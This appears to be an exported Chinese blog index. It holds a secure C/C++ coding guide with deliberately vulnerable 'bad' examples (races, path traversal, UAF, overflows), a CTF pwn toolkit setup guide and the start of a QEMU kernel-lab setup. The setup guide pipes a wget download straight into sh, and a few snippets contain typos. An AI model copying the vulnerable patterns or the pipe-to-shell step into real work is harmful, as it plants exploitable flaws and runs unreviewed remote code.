竞争条件经常出现在信号处理程序中，因为信号处理程序支持异步操作。攻击者能够利用信号处理程序争用条件导致软件状态损坏，从而可能导致拒绝服务甚至代码执行。 当信号处理程序中发生不可重入函数或状态敏感操作时，就会出现这些问题。因为信号处理程序中随时可以被调用。比如，当在信号处理程序中调用free时，通常会出现另一个信号争用条件，从而导致双重释放。即使给定指针在释放后设置为NULL，在释放内存和将指针设置为NULL之间仍然存在竞争的可能。 为多个信号设置了相同的信号处理程序，这尤其有问题——因为这意味着信号处理程序本身可能会重新进入。例如，malloc()和free()是不可重入的，因为它们可能使用全局或静态数据结构来管理内存，并且它们被syslog()等看似无害的函数间接使用；这些函数可能会导致内存损坏和代码执行。 // Bad char *log_message; void Handler(int signum) { syslog(LOG_NOTICE, \"%s\\n\", log_m_essage); free(log_message); sleep(10); exit(0); } int main (int argc, char* argv[]) { log_message = strdup(argv[1]); signal(SIGHUP, Handler); signal(SIGTERM, Handler); sleep(10); } 可以借由下列操作规避问题： 避免在多个处理函数中共享某些变量。 在信号处理程序中使用同步操作。 屏蔽不相关的信号，从而提供原子性。 避免在信号处理函数中调用不满足异步信号安全的函数。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争 TOCTOU： 软件在使用某个资源之前检查该资源的状态，但是该资源的状态可以在检查和使用之间更改，从而使检查结果无效。当资源处于这种意外状态时，这可能会导致软件执行错误操作。 当攻击者可以影响检查和使用之间的资源状态时，此问题可能与安全相关。这可能发生在共享资源(如文件、内存，甚至多线程程序中的变量)上。在编程时需要注意避免出现TOCTOU问题。 例如，下面的例子中，该文件可能已经在检查和lstat之间进行了更新，特别是因为printf有延迟。 struct stat *st; lstat(\"...\", st); printf(\"foo\"); if (st-\u003est_mtimespec == ...) { printf(\"Now updating things\\n\"); UpdateThings(); } TOCTOU难以修复，但是有以下缓解方案： 限制对来自多个进程的文件的交叉操作。 如果必须在多个进程或线程之间共享对资源的访问，那么请尝试限制”检查“（CHECK）和”使用“（USE）资源之间的时间量，使他们相距尽量不要太远。这不会从根本上解决问题，但可能会使攻击更难成功。 在Use调用之后重新检查资源，以验证是否正确执行了操作。 确保一些环境锁定机制能够被用来有效保护资源。但要确保锁定是检查之前进行的，而不是在检查之后进行的，以便检查时的资源与使用时的资源相同。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:3","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"4 加密解密 4.1 【必须】不得明文存储用户密码等敏感数据 用户密码应该使用 Argon2, scrypt, bcrypt, pbkdf2 等算法做哈希之后再存入存储系统, https://password-hashing.net/ https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage 用户敏感数据，应该做到传输过程中加密，存储状态下加密 传输过程中加密，可以使用 HTTPS 等认证加密通信协议 存储状态下加密，可以使用 SQLCipher 等类似方案。 4.2 【必须】内存中的用户密码等敏感数据应该安全抹除 例如用户密码等，即使是临时使用，也应在使用完成后应当将内容彻底清空。 错误： #include \u003copenssl/crypto.h\u003e #include \u003cunistd.h\u003e { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... } 正确： { ... string user_password(100, '\\0'); snprintf(\u0026user_password, \"password: %s\", user_password.size(), password_from_input); ... OPENSSL_cleanse(\u0026user_password[0], user_password.size()); } 关联漏洞: 高风险-敏感信息泄露 4.3 【必须】rand() 类函数应正确初始化 rand类函数的随机性并不高。而且在使用前需要使用srand()来初始化。未初始化的随机数可能导致某些内容可预测。 // Bad int main() { int foo = rand(); return 0; } 上述代码执行完成后，foo的值是固定的。它等效于 srand(1); rand();。 // Good int main() { srand(time(0)); int foo = rand(); return 0; } 关联漏洞: 高风险-逻辑漏洞 4.4 【必须】在需要高强度安全加密时不应使用弱PRNG函数 在需要生成 AES/SM1/HMAC 等算法的密钥/IV/Nonce， RSA/ECDSA/ECDH 等算法的私钥，这类需要高安全性的业务场景，必须使用密码学安全的随机数生成器 (Cryptographically Secure PseudoRandom Number Generator (CSPRNG) ), 不得使用 rand() 等无密码学安全性保证的普通随机数生成器。 推荐使用的 CSPRNG 有： OpenSSL 中的 RAND_bytes() 函数, https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html libsodium 中的 randombytes_buf() 函数 Linux kernel 的 getrandom() 系统调用, https://man7.org/linux/man-pages/man2/getrandom.2.html . 或者读 /dev/urandom 文件, 或者 /dev/random 文件。 Apple IOS 的 SecRandomCopyBytes(), https://developer.apple.com/documentation/security/1399291-secrandomcopybytes Windows 下的 BCryptGenRandom(), CryptGenRandom(), RtlGenRandom() #include \u003copenssl/aes.h\u003e #include \u003copenssl/crypto.h\u003e #include \u003copenssl/rand.h\u003e #include \u003cunistd.h\u003e { unsigned char key[16]; if (1 != RAND_bytes(\u0026key[0], sizeof(key))) { //... 错误处理 return -1; } AES_KEY aes_key; if (0 != AES_set_encrypt_key(\u0026key[0], sizeof(key) * 8, \u0026aes_key)) { // ... 错误处理 return -1; } ... OPENSSL_cleanse(\u0026key[0], sizeof(key)); } rand()类函数的随机性并不高。敏感操作时，如设计加密算法时，不得使用rand()或者类似的简单线性同余伪随机数生成器来作为随机数发生器。符合该定义的比特序列的特点是，序列中“1”的数量约等于“0”的数量；同理，“01”、“00”、“10”、“11”的数量大致相同，以此类推。 例如 C 标准库中的 rand() 的实现只是简单的线性同余算法，生成的伪随机数具有较强的可预测性。 当需要实现高强度加密，例如涉及通信安全时，不应当使用 rand() 作为随机数发生器。 实际应用中， C++11 标准提供的random_device保证加密的安全性和随机性 但是 C++ 标准并不保证这一点。跨平台的代码可以考虑用 OpenSSL 等保证密码学安全的库里的随机数发生器。 关联漏洞: 高风险-敏感数据泄露 4.5 【必须】自己实现的rand范围不应过小 如果在弱安全场景相关的算法中自己实现了PRNG，请确保rand出来的随机数不会很小或可预测。 // Bad int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 999999; 上述例子可能想生成0~999999共100万种可能的随机数，但是999999的二进制是11110100001000111111，与\u0026运算后，0位一直是0，所以生成出的范围明显会小于100万种。 // Good int32_t val = ((state[0] * 1103515245U) + 12345U) % 1000000; // Good int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 0x7fffffff; 关联漏洞: 高风险-逻辑漏洞 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:4","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"5 文件操作 5.1 【必须】避免路径穿越问题 在进行文件操作时，需要判断外部传入的文件名是否合法，如果文件名中包含 ../ 等特殊字符，则会造成路径穿越，导致任意文件的读写。 错误： void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; // 如果传入的文件名包含../可导致路径穿越 // 例如\"../file.txt\"，则可以读取到上层目录的file.txt文件 char name[20] = \"../file.txt\"; memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } 正确： void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; char name[20] = \"../file.txt\"; // 判断传入的文件名是否非法，例如\"../file.txt\"中包含非法字符../，直接返回 if (strstr(name, \"..\") != NULL){ // 包含非法字符 return; } memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } 关联漏洞: 高风险-逻辑漏洞 5.2 【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题） 在程序中，使用相对路径可能导致一些安全风险，例如DLL、EXE劫持等问题。 例如以下代码，可能存在劫持问题： int Foo() { // 传入的是dll文件名，如果当前目录下被写入了恶意的同名dll，则可能导致dll劫持 HINSTANCE hinst = ::LoadLibrary(\"dll_nolib.dll\"); if (hinst != NULL) { cout\u003c\u003c\"dll loaded!\" \u003c\u003c endl; } return 0; } 针对DLL劫持的安全编码的规范： 1）调用LoadLibrary，LoadLibraryEx，CreateProcess，ShellExecute等进行模块加载的函数时，指明模块的完整（全）路径，禁止使用相对路径，这样就可避免从其它目录加载DLL。 2）在应用程序的开头调用SetDllDirectory(TEXT(\"\")); 从而将当前目录从DLL的搜索列表中删除。结合SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题。这些API只能在打了KB2533623补丁的Windows7，2008上使用。 关联漏洞: 中风险-逻辑漏洞 5.3 【必须】文件权限控制 在创建文件时，需要根据文件的敏感级别设置不同的访问权限，以防止敏感数据被其他恶意程序读取或写入。 错误： int Foo() { // 不要设置为777权限，以防止被其他恶意程序操作 if (creat(\"file.txt\", 0777) \u003c 0) { printf(\"文件创建失败！\\n\"); } else { printf(\"文件创建成功！\\n\"); } return 0; } 关联漏洞: 中风险-逻辑漏洞 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:5","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"6 内存操作 6.1 【必须】防止各种越界写（向前/向后） 错误1： int a[5]; a[5] = 0; 错误2： int a[5]; int b = user_controlled_value; a[b] = 3; 关联漏洞: 高风险-内存破坏 6.2 【必须】防止任意地址写 任意地址写会导致严重的安全隐患，可能导致代码执行。因此，在编码时必须校验写入的地址。 错误： void Write(MyStruct dst_struct) { char payload[10] = { 0 }; memcpy(dst_struct.buf, payload, sizeof(payload)); } int main() { MyStruct dst_stuct; dst_stuct.buf = (char*)user_controlled_value; Write(dst_stuct); return 0; } 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:6","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"7 数字操作 7.1 【必须】防止整数溢出 在计算时需要考虑整数溢出的可能，尤其在进行内存操作时，需要对分配、拷贝等大小进行合法校验，防止整数溢出导致的漏洞。 错误（该例子在计算时产生整数溢出） const kMicLen = 4; // 整数溢出 void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; // Bad, 由于len小于4字节，导致计算拷贝长度时，整数溢出 // len - MIC_LEN == 0xfffffffd memcpy(dst, payload, len - kMicLen); } 正确例子 void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; int size = len - kMicLen; // 拷贝前对长度进行判断 if (size \u003e 0 \u0026\u0026 size \u003c 10) { memcpy(dst, payload, size); printf(\"memcpy good\\n\"); } } 关联漏洞: 高风险-内存破坏 7.2 【必须】防止Off-By-One 在进行计算或者操作时，如果使用的最大值或最小值不正确，使得该值比正确值多1或少1，可能导致安全风险。 错误： char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; strncat(fullname, firstname, 20); // 第二次调用strncat()可能会追加另外20个字符。如果这20个字符没有终止空字符，则存在安全问题 strncat(fullname, lastname, 20); 正确： char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; // 当使用像strncat()函数时，必须在缓冲区的末尾为终止空字符留下一个空字节，避免off-by-one strncat(fullname, firstname, sizeof(fullname) - strlen(fullname) - 1); strncat(fullname, lastname, sizeof(fullname) - strlen(fullname) - 1); 对于 C++ 代码，再次强烈建议使用 string、vector 等组件代替原始指针和数组操作。 关联漏洞: 高风险-内存破坏 7.3 【必须】避免大小端错误 在一些涉及大小端数据处理的场景，需要进行大小端判断，例如从大段设备取出的值，要以大段进行处理，避免端序错误使用。 关联漏洞: 中风险-逻辑漏洞 7.4 【必须】检查除以零异常 在进行除法运算时，需要判断被除数是否为零，以防导致程序不符合预期或者崩溃。 错误： double divide(double x, double y) { return x / y; } int divide(int x, int y) { return x / y; } 正确： double divide(double x, double y) { if (y == 0) { throw DivideByZero; } return x / y; } 关联漏洞: 低风险-拒绝服务 7.5 【必须】防止数字类型的错误强转 在有符号和无符号数字参与的运算中，需要注意类型强转可能导致的逻辑错误，建议指定参与计算时数字的类型或者统一类型参与计算。 错误例子 int Foo() { int len = 1; unsigned int size = 9; // 1 \u003c 9 - 10 ? 由于运算中无符号和有符号混用，导致计算结果以无符号计算 if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } 正确例子 void Foo() { // 统一两者计算类型为有符号 int len = 1; int size = 9; if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } 关联漏洞: 高风险-内存破坏 中风险-逻辑漏洞 7.6 【必须】比较数据大小时加上最小/最大值的校验 在进行数据大小比较时，要合理地校验数据的区间范围，建议根据数字类型，对其进行最大和最小值的判断，以防止非预期错误。 错误： void Foo(int index) { int a[30] = {0}; // 此处index是int型，只考虑了index小于数组大小，但是并未判断是否大于0 if (index \u003c 30) { // 如果index为负数，则越界 a[index] = 1; } } 正确： void Foo(int index) { int a[30] = {0}; // 判断index的最大最小值 if (index \u003e=0 \u0026\u0026 index \u003c 30) { a[index] = 1; } } 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:7","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"8 指针操作 8.1 【建议】检查在pointer上使用sizeof 除了测试当前指针长度，否则一般不会在pointer上使用sizeof。 正确： size_t pointer_length = sizeof(void*); 可能错误： size_t structure_length = sizeof(Foo*); 可能是： size_t structure_length = sizeof(Foo); 关联漏洞: 中风险-逻辑漏洞 8.2 【必须】检查直接将数组和0比较的代码 错误： int a[3]; ...; if (a \u003e 0) ...; 该判断永远为真，等价于: int a[3]; ...; if (\u0026a[0]) ...; 可能是： int a[3]; ...; if(a[0] \u003e 0) ...; 开启足够的编译器警告（GCC 中为 -Waddress，并已包含在 -Wall 中），并设置为错误，可以在编译期间发现该问题。 关联漏洞: 中风险-逻辑漏洞 8.3 【必须】不应当向指针赋予写死的地址 特殊情况需要特殊对待（比如开发硬件固件时可能需要写死） 但是如果是系统驱动开发之类的，写死可能会导致后续的问题。 关联漏洞: 高风险-内存破坏 8.4 【必须】检查空指针 错误： *foo = 100; if (!foo) { ERROR(\"foobar\"); } 正确： if (!foo) { ERROR(\"foobar\"); } *foo = 100; 错误： void Foo(char* bar) { *bar = '\\0'; } 正确： void Foo(char* bar) { if(bar) *bar = '\\0'; else ...; } 关联漏洞: 低风险-拒绝服务 8.5 【必须】释放完后置空指针 在对指针进行释放后，需要将该指针设置为NULL，以防止后续free指针的误用，导致UAF等其他内存破坏问题。尤其是在结构体、类里面存储的原始指针。 错误： void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // 此时p所指向的内存已被释放，但是p所指的地址仍然不变 printf(\"%s\\n\", p); free(p); // 未设置为NULL，可能导致UAF等内存错误 if (p != NULL) { // 没有起到防错作用 printf(\"%s\\n\", p); // 错误使用已经释放的内存 } } 正确： void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // 此时p所指向的内存已被释放，但是p所指的地址仍然不变 printf(\"%s\\n\", p); free(p); //释放后将指针赋值为空 p = NULL; if (p != NULL) { // 没有起到防错作用 printf(\"%s\\n\", p); // 错误使用已经释放的内存 } } 对于 C++ 代码，使用 string、vector、智能指针等代替原始内存管理机制，可以大量减少这类错误。 关联漏洞: 高风险-内存破坏 8.6 【必须】防止错误的类型转换（type confusion） 在对指针、对象或变量进行操作时，需要能够正确判断所操作对象的原始类型。如果使用了与原始类型不兼容的类型进行访问，则存在安全隐患。 错误： const int NAME_TYPE = 1; const int ID_TYPE = 2; // 该类型根据 msg_type 进行区分，如果在对MessageBuffer进行操作时没有判断目标对象，则存在类型混淆 struct MessageBuffer { int msg_type; union { const char *name; int name_id; }; }; void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_message; printf(\"Pointer of buf.name is %p\\n\", buf.name); // 没有判断目标消息类型是否为ID_TYPE，直接修改nameID，导致类型混淆 buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); // 以NAME_TYPE作为类型操作，可能导致非法内存读写 printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } 正确（判断操作的目标是否是预期类型）： void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_msessage; printf(\"Pointer of buf.name is %p\\n\", buf.name); // 判断目标消息类型是否为 ID_TYPE，不是预期类型则做对应操作 if (buf.msg_type == ID_TYPE) buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } 关联漏洞: 高风险-内存破坏 8.7 【必须】智能指针使用安全 在使用智能指针时，防止其和原始指针的混用，否则可能导致对象生命周期问题，例如 UAF 等安全风险。 错误例子： class Foo { public: explicit Foo(int num) { data_ = num; }; void Function() { printf(\"Obj is %p, data = %d\\n\", this, data_); }; private: int data_; }; std::unique_ptr\u003cFoo\u003e fool_u_ptr = nullptr; Foo* pfool_raw_ptr = nullptr; void Risk() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // 从独占智能指针中获取原始指针,\u003cFoo\u003e(1) pfool_raw_ptr = fool_u_ptr.get(); // 调用\u003cFoo\u003e(1)的函数 pfool_raw_ptr-\u003eFunction(); // 独占智能指针重新赋值后会释放内存 fool_u_ptr = make_unique\u003cFoo\u003e(2); // 通过原始指针操作会导致UAF，pfool_raw_ptr指向的对象已经释放 pfool_raw_ptr-\u003eFunction(); } // 输出： // Obj is 0000027943087B80, data = 1 // Obj is 0000027943087B80, data = -572662307 正确，通过智能指针操作: void Safe() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // 调用\u003cFoo\u003e(1)的函数 fool_u_ptr-\u003efunction(); fool_u_ptr = make_unique\u003cFoo\u003e(2); // 调用\u003cFoo\u003e(2)的函数 fool_u_ptr-\u003efunction(); } // 输出： // Obj is 000002C7BB550830, data = 1 // Obj is 000002C7BB557AF0, data = 2 关联漏洞: 高风险-内存破坏 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:8","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"参考链接 https://www.w3cschool.cn/secguide/secguide-ysdn3fk5.html ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:2:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["CTF"],"content":"Linux平台下的CTF Pwn环境搭建","date":"2020-12-25","objectID":"/2020/12/pwn/","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"Linux平台下的CTF Pwn环境搭建 ","date":"2020-12-25","objectID":"/2020/12/pwn/:0:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"前言 最近遇到很多人想玩CTF，咨询环境问题。为了更好地将研究重心放在技术本身，这里简单整理一下个人的Pwn环境的搭建过程，仅供参考。 ","date":"2020-12-25","objectID":"/2020/12/pwn/:1:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"一、操作系统选择 因为是Pwn环境，涉及到Windows平台的比较少，所以一般使用Linux或者MacOS。我个人是一套Linux的虚拟环境搭配MacOS的物理环境，基本能适应所有的Pwn环境要求。 物理环境：MBP 2015 虚拟环境：Ubuntu 18.04 需要注意，Linux的版本太高很多插件容易出问题，所以不建议使用最新版本的Linux系统，最稳定的不是太老旧的就可以。此外，环境因人而异，没有模板，不是固定的，按需分配。 ","date":"2020-12-25","objectID":"/2020/12/pwn/:2:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"二、必备一般软件 vim：个人必备，强烈建议学习一点vim的相关知识，可以提高效率，避免安装过多的编辑器或者IDE git：必备，很多高效的插件都是放在GitHub上的 python：必备，建议python3，毕竟python2已经不支持了 pip：必备，有一些插件需要使用pip进行安装 一款编辑器：这个看个人需求，vscode、sublime text等，个人喜欢就好。如果有条件的话，可以设置一下配置，当作一个简单的开发IDE使用，毕竟Pwn环境中开发的代码不会很多。 以上各软件根据官方文档自行安装即可。 ","date":"2020-12-25","objectID":"/2020/12/pwn/:3:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"三、Pwn常用软件 涉及到的各种软件的安装，均以Ubuntu平台为例 pwntools 一个ctf框架和漏洞利用开发库，用python开发,必备神器，作用不多解释。 安装方法： $ apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential $ pip install -U setuptools $ pip install --upgrade pip $ pip install --upgrade pwntools 个人使用的是python2版本，需要注意一下。pwntools现在支持python3了，这里给出GitHub地址，有需要的可以参考其readme进行安装python3的pwntools。 支持python3的pwntools 安装完成后，打开python测试, 执行from pwn import *不会报错即可。 （备注：在mac平台下不要使用pip安装，你会怀疑人生的，使用homebrew安装） gdb 动态调试软件，必备。 安装方法： apt-get install gdb peda/pwngdb/gef 这是常见的gdb的三个插件，配合gdb使用可以提升调试效率。 安装pwndbg： git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 安装peda： git clone https://github.com/longld/peda.git~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit 安装gef： wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh| sh wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit 因为在同一时刻只能使用一种插件，而且在解决不同类型的题目时使用不同的插件，因此需要配置三种插件的快捷切换。 首先，gdb使用哪种插件是在.gdbinit文件（一般在root目录下）中使用source进行控制的，我们可以在使用插件时注释掉其他的source命令，即可单独使用某一插件。但是每次都编辑该文件实在是麻烦，因此可以使用脚本进行选择。 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit #这个路径按照你的实际情况修改 # gdbinitfile=/root/Desktop/mode peda=\"source ~/peda/peda.py\" #这个路径按照你的实际情况修改 gef=\"source ~/.gdbinit-gef.py\" #这个路径按照你的实际情况修改 pwndbg=\"source /opt/pwndbg/gdbinit.py\" #这个路径按照你的实际情况修改 sign=$(cat $gdbinitfile | grep -n \"#this place is controled by user's shell\") #此处上面的查找内容要和你自己的保持一致 pattern=\":#this place is controled by user's shell\" number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\"TEST\" if [ $name -eq \"1\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $peda\" $gdbinitfile echo -e \"Please enjoy the peda!\\n\" elif [ $name -eq \"2\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $gef\" $gdbinitfile echo -e \"Please enjoy the gef!\\n\" else sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $pwndbg\" $gdbinitfile echo -e \"Please enjoy the pwndbg!\\n\" fi } echo -e \"Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\" read -p \"Input your choice:\" num if [ $num -eq \"1\" ];then Mode_change $num elif [ $num -eq \"2\" ];then Mode_change $num elif [ $num -eq \"3\" ];then Mode_change $num else echo -e \"Error!\\nPleasse input right number!\" fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9 现在我们把这个shell脚本放到一个环境变量指向的路径里面，查看一下自己的路径，shell脚本放进去 echo $PATH 我放在了/usr/local/sbin目录下，这样就可以执行 gdb.sh，输入对应插件的数字就可以选择使用哪个插件，无需手动更改.gdbinit文件。 实在不会可以参考这位师傅的教程：自动选择gdb插件 32位程序支持 必备，装它。 apt-get install libc6-dev-i386 qemu 这是arm的pwn环境，前期可以不安装，但是终究是逃不过的，建议一步到位。 安装qemu： sudo apt-get install qemu sudo apt-get install qemu-system qemu-user-static binfmt-support 安装依赖库： sudo apt-get install -y gcc-arm-linux-gnueabi sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git LibcSearcher 泄露libc库中函数的偏移的库，建议安装，可以节省时间，提高效率。 安装LibcSearcher： sudo pip install capstone git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py develop ROPgadget和one_gadget ROPgadget是用来找gadget的，one_gadget用来寻找libc库中的execve(’/bin/sh’, NULL, NULL)可以一个gadget就可以getshell，建议安装。 安装ROPgadget： # 先安装Capstone,它是一个轻量级的多平台架构支持的反汇编架构。 sudo apt-get install python-capstone 然后，下载好ROPgadget解压进入文件夹中 python setup.py install 安装one_gadget： sudo apt install ruby gem install one_gadget IDA 静态调试必备，不多解释。这里建议安装52上的版本： 52上的IDA ","date":"2020-12-25","objectID":"/2020/12/pwn/:4:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"四、总结 整理这篇文章的目的是希望在玩Pwn的时候可以不用花太多时间在环境上，搭配好一套环境一直用就好了，根据具体情况再进行补充。还是那句话，重心还是要放在技术本身上。 ","date":"2020-12-25","objectID":"/2020/12/pwn/:5:0","tags":["pwn"],"title":"Linux平台下的CTF Pwn环境搭建","uri":"/2020/12/pwn/"},{"categories":["Misc"],"content":"QEMU + Busybox 模拟 Linux 内核环境","date":"2020-12-24","objectID":"/2020/12/qemu/","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"QEMU + Busybox 模拟 Linux 内核环境 ","date":"2020-12-24","objectID":"/2020/12/qemu/:0:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"前言 最近转Linux平台，开始深入Linux内核相关，总结一下进行Linux内核环境模拟流程。结合Linux的内核源码一起，效果会比较好。 ","date":"2020-12-24","objectID":"/2020/12/qemu/:1:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"准备环境 ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"主机环境 Ubuntu 18.04 Linux ubuntu 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:1","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"需要使用的软件 使用主流的qemu+busybox进行模拟，底层的模拟实现软件内部完成，可以将重心放在内核调试上，避免在环境上浪费过多时间。qemu模拟器原生即支持gdb调试器，所以可以方便地使用gdb的强大功能对操作系统进行调试。 首先安装qemu，依次执行以下命令： sudo apt-get install qemu sudo apt-get install qemu-system sudo apt-get install qemu-user-static 